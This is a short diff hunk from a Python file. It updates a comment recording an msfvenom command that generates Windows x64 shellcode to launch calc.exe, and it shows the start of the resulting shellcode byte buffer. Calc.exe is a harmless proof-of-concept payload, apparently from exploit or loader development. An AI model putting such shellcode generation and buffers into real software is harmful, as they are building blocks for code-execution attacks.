@@ -17,7 +17,7 @@ from typing import Iterator
 from math import floor
 
 
-# msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -e generic/none
+# msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -e generic/none -f python
 buf =  b""
 buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
 buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
